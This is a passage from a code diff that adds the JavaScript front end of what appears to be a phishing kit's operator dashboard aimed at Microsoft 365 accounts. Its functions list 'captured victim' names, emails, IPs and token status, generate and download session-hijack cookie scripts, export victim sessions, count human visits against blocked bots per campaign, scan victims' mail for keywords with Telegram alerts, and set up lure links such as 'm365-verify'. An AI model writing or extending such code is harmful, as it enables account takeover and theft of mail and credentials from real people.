+                if (showAlert) alert("Network error executing scan.");
+            } finally {
+                if (btn) {
+                    btn.innerHTML = origHtml;
+                    btn.disabled = false;
+                }
+                if (refBtn) {
+                    refBtn.style.opacity = '1';
+                    refBtn.style.pointerEvents = 'auto';
+                }
+            }
+        }
+
+        async function openKeywordTelegramModal() {
+            const banner = document.getElementById('kwa-tg-status-banner');
+            if (banner) {
+                banner.style.display = 'none';
+                banner.innerHTML = '';
+            }
+            try {
+                const res = await fetch('/api/keyword_alerts/telegram_config');
+                if (res.ok) {
+                    const data = await res.json();
+                    const tokenInput = document.getElementById('kwa-tg-bot-token');
+                    const chatInput = document.getElementById('kwa-tg-chat-id');
+                    const enabledInput = document.getElementById('kwa-tg-enabled');
+                    if (tokenInput) tokenInput.value = data.bot_token || '';
+                    if (chatInput) chatInput.value = data.chat_id || '';
+                    if (enabledInput) enabledInput.checked = data.enabled !== false;
+                }
+            } catch (err) {
+                console.error("Error loading telegram config:", err);
+            }
+            const modal = document.getElementById('kwaTelegramModal');
+            if (modal) modal.classList.add('active');
+        }
+
+        function closeKeywordTelegramModal() {
+            const modal = document.getElementById('kwaTelegramModal');
+            if (modal) modal.classList.remove('active');
+        }
+
+        async function saveKeywordTelegramConfig(e) {
+            e.preventDefault();
+            const bot_token = (document.getElementById('kwa-tg-bot-token')?.value || '').trim();
+            const chat_id = (document.getElementById('kwa-tg-chat-id')?.value || '').trim();
+            const enabled = document.getElementById('kwa-tg-enabled')?.checked || false;
+            const btn = document.getElementById('kwa-btn-save-tg');
+            const origHtml = btn.innerHTML;
+            btn.innerHTML = '💾 Saving...';
+            btn.disabled = true;
+
+            const banner = document.getElementById('kwa-tg-status-banner');
+
+            try {
+                const res = await fetch('/api/keyword_alerts/telegram_config', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ bot_token, chat_id, enabled })
+                });
+                const data = await res.json();
+                if (res.ok && data.success) {
+                    if (banner) {
+                        banner.style.display = 'block';
+                        banner.style.background = 'rgba(63, 185, 80, 0.15)';
+                        banner.style.color = '#3fb950';
+                        banner.style.border = '1px solid rgba(63, 185, 80, 0.4)';
+                        banner.innerHTML = '✓ Dedicated Keyword Telegram Bot configuration saved!';
+                    }
+                    setTimeout(() => {
+                        closeKeywordTelegramModal();
+                    }, 1200);
+                } else {
+                    if (banner) {
+                        banner.style.display = 'block';
+                        banner.style.background = 'rgba(229, 9, 20, 0.15)';
+                        banner.style.color = '#f85149';
+                        banner.style.border = '1px solid rgba(229, 9, 20, 0.4)';
+                        banner.innerHTML = '⚠️ Failed to save: ' + (data.error || 'Unknown error');
+                    }
+                }
+            } catch (err) {
+                console.error("Error saving telegram config:", err);
+            } finally {
+                btn.innerHTML = origHtml;
+                btn.disabled = false;
+            }
+        }
+
+        async function testKeywordTelegramDirectly() {
+            const bot_token = (document.getElementById('kwa-tg-bot-token')?.value || '').trim();
+            const chat_id = (document.getElementById('kwa-tg-chat-id')?.value || '').trim();
+            const btn = document.getElementById('kwa-btn-test-tg');
+            const origHtml = btn.innerHTML;
+            btn.innerHTML = '⏳ Testing...';
+            btn.disabled = true;
+
+            const banner = document.getElementById('kwa-tg-status-banner');
+            if (banner) {
+                banner.style.display = 'block';
+                banner.style.background = 'rgba(88, 166, 255, 0.15)';
+                banner.style.color = '#58a6ff';
+                banner.style.border = '1px solid rgba(88, 166, 255, 0.4)';
+                banner.innerHTML = 'Connecting to Telegram API...';
+            }
+
+            try {
+                const res = await fetch('/api/keyword_alerts/test_telegram', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ bot_token, chat_id })
+                });
+                const data = await res.json();
+                if (res.ok && data.success) {
+                    if (banner) {
+                        banner.style.display = 'block';
+                        banner.style.background = 'rgba(63, 185, 80, 0.15)';
+                        banner.style.color = '#3fb950';
+                        banner.style.border = '1px solid rgba(63, 185, 80, 0.4)';
+                        banner.innerHTML = '✓ ' + (data.message || 'Test alert delivered to Telegram successfully!');
+                    }
+                } else {
+                    if (banner) {
+                        banner.style.display = 'block';
+                        banner.style.background = 'rgba(229, 9, 20, 0.15)';
+                        banner.style.color = '#f85149';
+                        banner.style.border = '1px solid rgba(229, 9, 20, 0.4)';
+                        banner.innerHTML = '⚠️ Telegram Error: ' + (data.message || 'Delivery failed');
+                    }
+                }
+            } catch (err) {
+                if (banner) {
+                    banner.style.display = 'block';
+                    banner.style.background = 'rgba(229, 9, 20, 0.15)';
+                    banner.style.color = '#f85149';
+                    banner.style.border = '1px solid rgba(229, 9, 20, 0.4)';
+                    banner.innerHTML = '⚠️ Network error communicating with server.';
+                }
+            } finally {
+                btn.innerHTML = origHtml;
+                btn.disabled = false;
+            }
+        }
+
+        async function toggleTriageMatch(matchId, isTriaged) {
+            try {
+                await fetch(`/api/keyword_alerts/matches/${matchId}/triage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ is_triaged: isTriaged })
+                });
+                loadKeywordAlertsData();
+            } catch (err) {
+                console.error("Error triaging match:", err);
+            }
+        }
+
+        async function deleteKeywordMatch(matchId) {
+            try {
+                await fetch(`/api/keyword_alerts/matches/${matchId}`, { method: 'DELETE' });
+                const card = document.getElementById(`kwa-match-card-${matchId}`);
+                if (card) card.remove();
+                loadKeywordAlertsData();
+            } catch (err) {
+                console.error("Error deleting match:", err);
+            }
+        }
+
+        async function clearAllKeywordMatches() {
+            const ok = await appConfirm({
+                title: 'Clear Detected Keyword Hits',
+                message: 'Are you sure you want to clear all detected keyword hits? This will reset the hit history.',
+                confirmText: 'Clear Hits',
+                danger: true,
+                icon: '🧹'
+            });
+            if (!ok) return;
+            try {
+                await fetch('/api/keyword_alerts/matches/clear', { method: 'POST' });
+                showToast('✓ All keyword hits cleared');
+                loadKeywordAlertsData();
+            } catch (err) {
+                showToast('⚠️ Error clearing matches: ' + err);
+            }
+        }
+
+        function copyMatchSnippet(kw, subj, snip) {
+            const text = `🎯 KEYWORD: ${kw}\n✉️ SUBJECT: ${subj}\n💬 SNIPPET: ${snip}`;
+            navigator.clipboard.writeText(text).then(() => {
+                showToast("✓ Match snippet copied to clipboard!");
+            });
+        }
+
+        function escapeRegex(string) {
+            return string.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&');
+        }
+
+        function renderCountdown(expirySec) {
+            if (!expirySec) return '<span style="color:#605e5c;">N/A</span>';
+            const now = Math.floor(Date.now() / 1000);
+            const diff = expirySec - now;
+            if (diff <= 0) {
+                return '<span style="color:var(--danger); font-weight:600;">⚠️ Expired (Refreshing...)</span>';
+            }
+            const mins = Math.floor(diff / 60);
+            const secs = diff % 60;
+            const padSecs = secs < 10 ? '0' + secs : secs;
+            if (diff <= 600) {
+                return `<span style="color:#d29922; font-weight:600;">⏳ ${mins}m ${padSecs}s</span>`;
+            }
+            return `<span style="color:var(--success); font-weight:600;">⏱️ ${mins}m ${padSecs}s</span>`;
+        }
+
+        function updateLiveCountdowns() {
+            document.querySelectorAll('.token-countdown').forEach(el => {
+                const exp = parseInt(el.getAttribute('data-expiry') || '0', 10);
+                el.innerHTML = renderCountdown(exp);
+            });
+
+            document.querySelectorAll('.live-session-countdown').forEach(el => {
+                const createdStr = el.getAttribute('data-created') || '';
+                const userCode = el.getAttribute('data-usercode') || '';
+                let createdUtc = createdStr.trim();
+                if (createdUtc && !createdUtc.endsWith('Z') && !createdUtc.includes('+')) {
+                    createdUtc = createdUtc.replace(' ', 'T') + 'Z';
+                }
+                const createdTs = Date.parse(createdUtc);
+                if (!isNaN(createdTs)) {
+                    const elapsed = Math.floor((Date.now() - createdTs) / 1000);
+                    const remaining = Math.max(0, 900 - elapsed);
+                    if (remaining > 0) {
+                        const m = String(Math.floor(remaining / 60)).padStart(2, '0');
+                        const s = String(remaining % 60).padStart(2, '0');
+                        el.innerHTML = `⏱️ ${m}:${s} remaining`;
+                        el.style.color = remaining < 180 ? '#ff6b72' : '#58a6ff';
+                    } else {
+                        el.innerHTML = `⏱️ Expired`;
+                        el.style.color = '#ff6b72';
+                        el.style.borderColor = '#ff6b72';
+                        if (!el.getAttribute('data-expired-fired')) {
+                            el.setAttribute('data-expired-fired', '1');
+                            fetch(`/api/sessions/${userCode}/expire`, { method: 'POST' }).catch(()=>{});
+                            setTimeout(() => { if (typeof loadSessions === 'function') loadSessions(); }, 3000);
+                        }
+                    }
+                }
+            });
+        }
+
+        async function manualRefresh(userCode) {
+            const btn = document.getElementById('btn-ref-' + userCode);
+            if (btn) {
+                btn.disabled = true;
+                btn.innerText = 'Refreshing...';
+            }
+            try {
+                const res = await fetch(`/api/sessions/${userCode}/refresh`, { method: 'POST' });
+                const data = await res.json();
+                if (data.success) {
+                    await loadDashboard();
+                } else {
+                    alert('Refresh failed: ' + (data.error || 'Unknown error'));
+                    if (btn) { btn.disabled = false; btn.innerText = '🔄 Refresh'; }
+                }
+            } catch(e) {
+                alert('Request failed: ' + e);
+                if (btn) { btn.disabled = false; btn.innerText = '🔄 Refresh'; }
+            }
+        }
+
+        let currentCookieSnippet = '';
+        let currentCookieVictim = '';
+
+        function showToast(msg) {
+            const toast = document.getElementById('toast');
+            if (!toast) return;
+            toast.innerText = msg;
+            toast.style.display = 'block';
+            toast.style.opacity = '1';
+            clearTimeout(toast._timer);
+            toast._timer = setTimeout(() => {
+                toast.style.opacity = '0';
+                setTimeout(() => { toast.style.display = 'none'; }, 300);
+            }, 3000);
+        }
+
+        async function openCookieModal(uc, btnEl = null) {
+            let origHtml = '';
+            if (btnEl) {
+                origHtml = btnEl.innerHTML;
+                btnEl.innerHTML = '⏳ Generating...';
+                btnEl.disabled = true;
+            }
+            try {
+                const res = await (await fetch(`/api/sessions/${uc}/cookie`, { method: 'POST' })).json();
+                if (res.success) {
+                    currentCookieSnippet = res.js_script;
+                    currentCookieVictim = res.victim_name || uc;
+                    document.getElementById('cookie-script-text').value = res.js_script;
+                    document.getElementById('cookieModal').classList.add('active');
+                } else {
+                    showToast('⚠️ Failed to generate cookie: ' + (res.error || 'Unknown error'));
+                }
+            } catch (err) {
+                showToast('⚠️ Request failed: ' + err);
+            } finally {
+                if (btnEl) {
+                    btnEl.innerHTML = origHtml;
+                    btnEl.disabled = false;
+                }
+            }
+        }
+
+        function closeCookieModal() {
+            document.getElementById('cookieModal').classList.remove('active');
+        }
+
+        function appConfirm({ title = 'Confirm Action', message = 'Are you sure you want to proceed?', confirmText = 'Confirm', cancelText = 'Cancel', icon = '⚠️', danger = true } = {}) {
+            return new Promise((resolve) => {
+                const modal = document.getElementById('appConfirmModal');
+                if (!modal) {
+                    resolve(window.confirm(message));
+                    return;
+                }
+                const titleEl = document.getElementById('appConfirmTitle');
+                const msgEl = document.getElementById('appConfirmMessage');
+                const iconEl = document.getElementById('appConfirmIcon');
+                const btnEl = document.getElementById('appConfirmBtn');
+
+                if (titleEl) titleEl.innerText = title;
+                if (msgEl) msgEl.innerText = message;
+                if (iconEl) iconEl.innerText = icon;
+                if (btnEl) {
+                    btnEl.innerText = confirmText;
+                    btnEl.style.background = danger ? '#e50914' : '#0078D4';
+                    btnEl.style.boxShadow = danger ? '0 4px 14px rgba(229,9,20,0.4)' : '0 4px 14px rgba(0,120,212,0.4)';
+                }
+                window._appConfirmResolver = resolve;
+                modal.classList.add('active');
+            });
+        }
+
+        function closeAppConfirm(confirmed) {
+            const modal = document.getElementById('appConfirmModal');
+            if (modal) modal.classList.remove('active');
+            if (typeof window._appConfirmResolver === 'function') {
+                const res = window._appConfirmResolver;
+                window._appConfirmResolver = null;
+                res(Boolean(confirmed));
+            }
+        }
+
+        function copyCookieScript() {
+            const txt = document.getElementById('cookie-script-text').value;
+            navigator.clipboard.writeText(txt).then(() => {
+                showToast('Cookie copied to clipboard!');
+            }).catch(() => {
+                showToast('Please select text and copy manually');
+            });
+        }
+
+        function downloadCookieTxt() {
+            const blob = new Blob([currentCookieSnippet], { type: 'text/plain;charset=utf-8' });
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = `${currentCookieVictim}_cookie.txt`;
+            a.click();
+            showToast('Downloaded ' + a.download);
+        }
+
+        async function exportSession(uc) {
+            showToast('Preparing export JSON...');
+            try {
+                const res = await (await fetch(`/api/sessions/${uc}/export`)).json();
+                const blob = new Blob([JSON.stringify(res, null, 2)], { type: 'application/json' });
+                const a = document.createElement('a');
+                a.href = URL.createObjectURL(blob);
+                const name = (res.victim_name || res.victim_email || uc).replace(/\s+/g, '_');
+                a.download = `${name}_export.json`;
+                a.click();
+                showToast('Export downloaded successfully!');
+            } catch(e) {
+                alert('Export failed: ' + e);
+            }
+        }
+
+        let allTokensData = [];
+        let dashCurrentPage = 1;
+        let dashPageSize = 10;
+        let dashSortField = 'added';
+        let dashSortDir = 'desc';
+        let dashSearchQuery = '';
+        let dashStatusFilter = 'ALL';
+        let dashNotifications = [];
+
+        async function loadPlatformNotifications() {
+            try {
+                const res = await fetch('/api/notifications');
+                if (!res.ok) return;
+                const data = await res.json();
+                const cleared = JSON.parse(localStorage.getItem('crimson_cleared_notifs') || '[]');
+                const fresh = (data.notifications || []).filter(n => !cleared.includes(n.id));
+                dashNotifications = fresh;
+                renderNotifications();
+            } catch (err) {
+                console.error("Failed to load notifications:", err);
+            }
+        }
+
+        function toggleNotifications(e) {
+            if (e) e.stopPropagation();
+            const dd = document.getElementById('ab-notif-dropdown');
+            if (!dd) return;
+            const isVis = dd.style.display !== 'none';
+            dd.style.display = isVis ? 'none' : 'block';
+            renderNotifications();
+        }
+
+        async function confirmResetVisitorStats() {
+            const ok = await appConfirm({
+                title: 'Reset Visitor Statistics?',
+                message: "This will reset all visitor and telemetry hit metrics (Total Visits, Today's Visits, Human Visits, and Blocked Bots) back to 0 for a new campaign cycle.\n\nAll captured victim credentials, sessions, and active campaign deployments will strictly remain intact.",
+                confirmText: 'Reset Stats',
+                icon: '🔄',
+                danger: true
+            });
+            if (!ok) return;
+
+            const btn = document.getElementById('btn-reset-stats');
+            if (btn) {
+                btn.disabled = true;
+                btn.innerHTML = '<span>⏳ Resetting...</span>';
+            }
+
+            try {
+                const res = await (await fetch('/api/statistics/reset', { method: 'POST' })).json();
+                if (res.success) {
+                    const elTotV = document.getElementById('stat-total-visits');
+                    if (elTotV) elTotV.innerText = '0';
+                    const elTodV = document.getElementById('stat-today-visits');
+                    if (elTodV) elTodV.innerText = '0';
+                    const elHumV = document.getElementById('stat-human-visits');
+                    if (elHumV) elHumV.innerText = '0';
+                    const elBotV = document.getElementById('stat-bot-visits');
+                    if (elBotV) elBotV.innerText = '0';
+
+                    showToast('✅ Visitor telemetry statistics reset to zero.');
+                } else {
+                    showToast('⚠️ Reset failed: ' + (res.error || 'Server rejected request'));
+                }
+            } catch (err) {
+                showToast('⚠️ Reset request failed: ' + err);
+            } finally {
+                if (btn) {
+                    btn.disabled = false;
+                    btn.innerHTML = `
+                        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/>
+                            <path d="M3 3v5h5"/>
+                        </svg>
+                        <span>Reset Stats</span>`;
+                }
+            }
+        }
+
+        function clearNotifications() {
+            const cleared = JSON.parse(localStorage.getItem('crimson_cleared_notifs') || '[]');
+            dashNotifications.forEach(n => {
+                if (!cleared.includes(n.id)) cleared.push(n.id);
+            });
+            localStorage.setItem('crimson_cleared_notifs', JSON.stringify(cleared));
+            dashNotifications = [];
+            renderNotifications();
+        }
+
+        function renderNotifications() {
+            const list = document.getElementById('ab-notif-list');
+            const badge = document.getElementById('ab-notif-count');
+            if (badge) {
+                if (dashNotifications.length > 0) {
+                    badge.innerText = dashNotifications.length > 99 ? '99+' : dashNotifications.length;
+                    badge.style.display = 'block';
+                } else {
+                    badge.style.display = 'none';
+                }
+            }
+            if (!list) return;
+            if (dashNotifications.length === 0) {
+                list.innerHTML = '<div class="ab-notif-empty">No new notifications</div>';
+            } else {
+                list.innerHTML = dashNotifications.map(n => `
+                    <div class="ab-notif-item">
+                        <div style="display:flex; align-items:center; gap:6px;">
+                            <span>${n.icon || '🔔'}</span>
+                            <strong style="color:#ffffff;">${escapeHtml(n.title)}</strong>
+                        </div>
+                        ${n.subtitle ? `<div style="font-size:11px; color:#58a6ff; font-family:monospace; margin-top:2px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">${escapeHtml(n.subtitle)}</div>` : ''}
+                        <div class="ab-notif-time">${escapeHtml(n.time || '')}</div>
+                    </div>
+                `).join('');
+            }
+        }
+
+        function toggleFilterMenu(e) {
+            if (e) e.stopPropagation();
+            const pop = document.getElementById('ab-filter-popover');
+            if (!pop) return;
+            pop.style.display = pop.style.display === 'none' ? 'flex' : 'none';
+        }
+
+        function onStatusFilterChange(val) {
+            dashStatusFilter = val;
+            dashCurrentPage = 1;
+            const pop = document.getElementById('ab-filter-popover');
+            if (pop) pop.style.display = 'none';
+            const btn = document.getElementById('ab-filter-toggle-btn');
+            if (btn) {
+                if (val !== 'ALL') btn.classList.add('active');
+                else btn.classList.remove('active');
+            }
+            renderAbTable();
+        }
+
+        function onTableSearch(val) {
+            dashSearchQuery = (val || '').trim().toLowerCase();
+            dashCurrentPage = 1;
+            renderAbTable();
+        }
+
+        function changeAbPageSize(val) {
+            dashPageSize = parseInt(val, 10) || 10;
+            dashCurrentPage = 1;
+            const selTop = document.getElementById('ab-page-size-select');
+            if (selTop) selTop.value = String(dashPageSize);
+            renderAbTable();
+        }
+
+        function goToAbPage(p) {
+            dashCurrentPage = p;
+            renderAbTable();
+        }
+
+        function sortAbTable(field) {
+            if (dashSortField === field) {
+                dashSortDir = dashSortDir === 'asc' ? 'desc' : 'asc';
+            } else {
+                dashSortField = field;
+                dashSortDir = 'asc';
+            }
+            updateSortIcons();
+            renderAbTable();
+        }
+
+        function updateSortIcons() {
+            ['sn','name','email','added','token'].forEach(f => {
+                const icon = document.getElementById('sort-icon-' + f);
+                if (!icon) return;
+                if (dashSortField === f) {
+                    icon.innerText = dashSortDir === 'asc' ? '↑' : '↓';
+                    icon.style.opacity = '1';
+                } else {
+                    icon.innerText = '⇅';
+                    icon.style.opacity = '0.5';
+                }
+            });
+        }
+
+        function resetTableSort() {
+            dashSortField = 'added';
+            dashSortDir = 'desc';
+            dashSearchQuery = '';
+            dashStatusFilter = 'ALL';
+            dashCurrentPage = 1;
+            const sInput = document.getElementById('ab-table-search');
+            if (sInput) sInput.value = '';
+            const fBtn = document.getElementById('ab-filter-toggle-btn');
+            if (fBtn) fBtn.classList.remove('active');
+            updateSortIcons();
+            renderAbTable();
+        }
+
+        let allRowsSelected = false;
+        function toggleSelectAllRows() {
+            allRowsSelected = !allRowsSelected;
+            showToast(allRowsSelected ? 'Selected all active rows' : 'Deselected all rows');
+        }
+
+        function formatAbDate(ts) {
+            if (!ts) return 'Just now';
+            try {
+                const clean = ts.replace(' ', 'T') + (ts.includes('Z') ? '' : 'Z');
+                const d = new Date(clean);
+                if (isNaN(d.getTime())) return ts;
+                const months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sept','Oct','Nov','Dec'];
+                const day = d.getDate();
+                const mon = months[d.getMonth()];
+                let hours = d.getHours();
+                const mins = String(d.getMinutes()).padStart(2, '0');
+                const ampm = hours >= 12 ? 'pm' : 'am';
+                hours = hours % 12;
+                hours = hours ? hours : 12;
+                return `${day} ${mon} ${hours}:${mins} ${ampm}`;
+            } catch(e) {
+                return ts;
+            }
+        }
+
+        function renderAbTable() {
+            const tbody = document.getElementById('ab-captured-tbody');
+            if (!tbody) return;
+
+            // 1. Filter
+            let filtered = allTokensData.filter(s => {
+                const isRevoked = (s.status === 'REVOKED' || s.status === 'EXPIRED');
+                if (dashStatusFilter === 'ACTIVE' && isRevoked) return false;
+                if (dashStatusFilter === 'REVOKED' && !isRevoked) return false;
+
+                if (dashSearchQuery) {
+                    const haystack = [
+                        s.victim_name || '',
+                        s.victim_email || '',
+                        s.victim_role || '',
+                        s.victim_ip || '',
+                        s.victim_browser || '',
+                        s.status || ''
+                    ].join(' ').toLowerCase();
+                    if (!haystack.includes(dashSearchQuery)) return false;
+                }
+                return true;
+            });
+
+            // 2. Sort
+            filtered.sort((a, b) => {
+                let vA = '';
+                let vB = '';
+                if (dashSortField === 'sn') {
+                    vA = a._origIndex;
+                    vB = b._origIndex;
+                    return dashSortDir === 'asc' ? vA - vB : vB - vA;
+                } else if (dashSortField === 'name') {
+                    vA = (a.victim_name || '').toLowerCase();
+                    vB = (b.victim_name || '').toLowerCase();
+                } else if (dashSortField === 'email') {
+                    vA = (a.victim_email || '').toLowerCase();
+                    vB = (b.victim_email || '').toLowerCase();
+                } else if (dashSortField === 'added') {
+                    vA = a.created_at || '';
+                    vB = b.created_at || '';
+                } else if (dashSortField === 'token') {
+                    vA = (a.status === 'CAPTURED' ? 'ACTIVE' : 'REVOKED');
+                    vB = (b.status === 'CAPTURED' ? 'ACTIVE' : 'REVOKED');
+                }
+                if (vA < vB) return dashSortDir === 'asc' ? -1 : 1;
+                if (vA > vB) return dashSortDir === 'asc' ? 1 : -1;
+                return 0;
+            });
+
+            const total = filtered.length;
+            const totalPages = Math.max(1, Math.ceil(total / dashPageSize));
+            if (dashCurrentPage > totalPages) dashCurrentPage = totalPages;
+            if (dashCurrentPage < 1) dashCurrentPage = 1;
+
+            const startIdx = (dashCurrentPage - 1) * dashPageSize;
+            const endIdx = Math.min(startIdx + dashPageSize, total);
+            const paged = filtered.slice(startIdx, endIdx);
+
+            if (total === 0) {
+                tbody.innerHTML = '<tr><td colspan="9" style="text-align:center; color:#8e7d9b; padding:32px;">No tokens matching criteria.</td></tr>';
+            } else {
+                tbody.innerHTML = paged.map((s, idx) => {
+                    const safeUserCode = (s.user_code || '').replace(/'/g, "\\'");
+                    const isRevoked = (s.status === 'REVOKED' || s.status === 'EXPIRED');
+                    const seqNum = startIdx + idx + 1;
+                    const name = s.victim_name || 'Unknown';
+                    const email = s.victim_email || 'Unknown';
+                    const role = s.victim_role || 'Member';
+                    const ip = s.victim_ip || 'N/A';
+                    const browser = s.victim_browser || 'N/A';
+                    const addedStr = formatAbDate(s.created_at);
+
+                    return `<tr>
+                        <td style="color:#8e7d9b; font-weight:700;">${seqNum}</td>
+                        <td class="ab-name-cell">${name}</td>
+                        <td class="ab-email-cell">${email}</td>
+                        <td class="ab-role-cell">${role}</td>
+                        <td class="ab-ip-cell">${ip}</td>
+                        <td class="ab-browser-cell" title="${browser}">${browser}</td>
+                        <td class="ab-added-cell">${addedStr}</td>
+                        <td>
+                            <span class="ab-token-badge ${isRevoked ? 'revoked' : 'active'}">${isRevoked ? 'REVOKED' : 'ACTIVE'}</span>
+                        </td>
+                        <td>
+                            <div class="ab-action-group">
+                                <button type="button" class="ab-action-cookie-btn" onclick="openCookieModal('${safeUserCode}', this)" title="Generate cookie">COOKIE</button>
+                                <button type="button" class="ab-action-circle-btn" onclick="exportSession('${safeUserCode}')" title="Export session">
+                                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="17 8 12 3 7 8"></polyline><line x1="12" y1="3" x2="12" y2="15"></line></svg>
+                                </button>
+                                <button type="button" class="ab-action-circle-btn ab-action-delete-btn" onclick="deleteSession('${safeUserCode}')" title="Delete victim record">
+                                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"></polyline><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path></svg>
+                                </button>
+                            </div>
+                        </td>
+                    </tr>`;
+                }).join('');
+            }
+
+            // Sync pagination labels
+            const infoText = total === 0 ? 'Showing 0 to 0 of 0 entries' : `Showing ${startIdx + 1} to ${endIdx} of ${total} entries`;
+            ['ab-pagination-info', 'ab-pagination-info-bottom'].forEach(id => {
+                const el = document.getElementById(id);
+                if (el) el.innerText = infoText;
+            });
+
+            // Build pagination nav buttons
+            let navHtml = '';
+            if (total > 0 && totalPages > 1) {
+                navHtml += `<button type="button" class="ab-page-btn" ${dashCurrentPage <= 1 ? 'disabled' : ''} onclick="goToAbPage(${dashCurrentPage - 1})">Previous</button>`;
+                for (let i = 1; i <= totalPages; i++) {
+                    if (totalPages <= 7 || i === 1 || i === totalPages || (i >= dashCurrentPage - 1 && i <= dashCurrentPage + 1)) {
+                        const activeCls = i === dashCurrentPage ? 'active' : '';
+                        navHtml += `<button type="button" class="ab-page-btn ${activeCls}" onclick="goToAbPage(${i})">${i}</button>`;
+                    } else if (i === dashCurrentPage - 2 || i === dashCurrentPage + 2) {
+                        navHtml += `<span style="padding:0 3px; color:#8e7d9b;">...</span>`;
+                    }
+                }
+                navHtml += `<button type="button" class="ab-page-btn" ${dashCurrentPage >= totalPages ? 'disabled' : ''} onclick="goToAbPage(${dashCurrentPage + 1})">Next</button>`;
+            }
+
+            ['ab-pagination-nav', 'ab-pagination-nav-bottom'].forEach(id => {
+                const el = document.getElementById(id);
+                if (el) el.innerHTML = navHtml;
+            });
+        }
+
+        async function loadDashboard() {
+            try {
+                // 1. Fetch user info
+                try {
+                    const uRes = await fetch('/api/auth/me');
+                    if (uRes.ok) {
+                        const uData = await uRes.json();
+                        if (uData.username) {
+                            const uEl = document.getElementById('dash-welcome-user');
+                            if (uEl) {
+                                let name = uData.username;
+                                if (name.toLowerCase() === 'admin') name = 'Admin';
+                                else name = name.charAt(0).toUpperCase() + name.slice(1);
+                                uEl.innerText = name;
+                            }
+                        }
+                    }
+                } catch(e) {}
+
+                // 2. Fetch stats
+                const stats = await (await fetch('/api/statistics')).json();
+                const totalVisits = stats.total_visits !== undefined ? stats.total_visits : (stats.total_links || 0);
+                const todayVisits = stats.today_visits !== undefined ? stats.today_visits : 0;
+                const humanVisits = stats.human_visits !== undefined ? stats.human_visits : 0;
+                const botVisits = stats.bot_visits !== undefined ? stats.bot_visits : 0;
+                const activeTokens = stats.active_tokens !== undefined ? stats.active_tokens : (stats.captured_accounts || 0);
+                const revokedTokens = stats.revoked_tokens !== undefined ? stats.revoked_tokens : 0;
+                const totalTokens = stats.total_tokens !== undefined ? stats.total_tokens : (activeTokens + revokedTokens);
+
+                const elTotV = document.getElementById('stat-total-visits');
+                if (elTotV) elTotV.innerText = totalVisits;
+                const elTodV = document.getElementById('stat-today-visits');
+                if (elTodV) elTodV.innerText = todayVisits;
+                const elHumV = document.getElementById('stat-human-visits');
+                if (elHumV) elHumV.innerText = humanVisits;
+                const elBotV = document.getElementById('stat-bot-visits');
+                if (elBotV) elBotV.innerText = botVisits;
+                const elAct = document.getElementById('stat-active-tokens');
+                if (elAct) elAct.innerText = activeTokens;
+                const elInc = document.getElementById('stat-incomplete-sessions');
+                if (elInc) elInc.innerText = stats.incomplete_sessions !== undefined ? stats.incomplete_sessions : 0;
+                const elRev = document.getElementById('stat-revoked-tokens');
+                if (elRev) elRev.innerText = revokedTokens;
+                const elPill = document.getElementById('ab-captured-count-pill');
+                if (elPill) elPill.innerText = totalTokens;
+
+                // 3. Fetch sessions and filter for genuine captured/revoked tokens
+                const sessions = await (await fetch('/api/sessions')).json();
+                allTokensData = sessions.filter(s => {
+                    const hasAuth = (s.status === 'CAPTURED' || s.status === 'REVOKED');
+                    const hasEmail = s.victim_email && s.victim_email.trim() && s.victim_email.toLowerCase() !== 'unknown';
+                    const hasName = s.victim_name && s.victim_name.trim() && s.victim_name.toLowerCase() !== 'unknown';
+                    return hasAuth && (hasEmail || hasName);
+                });
+                allTokensData.forEach((s, idx) => { s._origIndex = idx + 1; });
+
+                await loadPlatformNotifications();
+                updateSortIcons();
+                renderAbTable();
+            } catch (err) {
+                console.error('loadDashboard error:', err);
+            }
+        }
+
+        // Close dropdowns when clicking outside
+        document.addEventListener('click', function(e) {
+            const notifWrap = document.querySelector('.ab-notif-wrap');
+            const notifDd = document.getElementById('ab-notif-dropdown');
+            if (notifDd && notifDd.style.display !== 'none' && notifWrap && !notifWrap.contains(e.target)) {
+                notifDd.style.display = 'none';
+            }
+            const filterWrap = document.querySelector('.ab-filter-btn-wrap');
+            const filterPop = document.getElementById('ab-filter-popover');
+            if (filterPop && filterPop.style.display !== 'none' && filterWrap && !filterWrap.contains(e.target)) {
+                filterPop.style.display = 'none';
+            }
+        });
+
+        // Close modal when clicking outside
+        document.getElementById('cookieModal')?.addEventListener('click', function(e) {
+            if (e.target === this) closeCookieModal();
+        });
+        document.getElementById('appConfirmModal')?.addEventListener('click', function(e) {
+            if (e.target === this) closeAppConfirm(false);
+        });
+        document.getElementById('outlookComposeModal')?.addEventListener('click', function(e) {
+            if (e.target === this) closeComposeModal();
+        });
+        document.getElementById('outlookSettingsModal')?.addEventListener('click', function(e) {
+            if (e.target === this) closeSettingsModal();
+        });
+        document.getElementById('outlookAttachmentPreviewModal')?.addEventListener('click', function(e) {
+            if (e.target === this) closeAttachmentPreviewModal();
+        });
+
+        // ─── LINK GENERATOR SYSTEM (Phase 2 + Realtime Interactive Editor) ───
+        let lgCurrentPreviewTab = 'preland';
+        let lgCurrentLandingMode = 'S';
+        let lgBgImageData = '/static/img/bg_blueprint.jpg';
+        let lgLogoImageData = '';
+        let lgPathUserCustomized = false;
+        const LG_TEMPLATE_SLUGS = {
+            'Microsoft 365': ['m365-verify', 'm365-portal', 'm365-security', 'm365-identity', 'm365-access'],
